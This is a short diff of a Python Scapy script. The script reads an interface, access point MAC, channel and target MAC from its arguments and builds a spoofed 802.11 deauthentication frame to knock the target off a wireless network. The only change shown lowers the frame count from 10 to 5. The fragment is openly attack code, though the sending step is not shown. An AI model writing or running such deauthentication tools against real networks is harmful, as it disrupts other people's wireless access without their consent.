@@ -10,7 +10,7 @@ interface=sys.argv[1]
 ap_mac=sys.argv[2]
 channel=sys.argv[3]
 target_mac=sys.argv[4]
-counts=10
+counts=5
 
 packet=RadioTap()/Dot11(addr1=target_mac,addr2=ap_mac,addr3=ap_mac)/Dot11Deauth(reason=7)
 
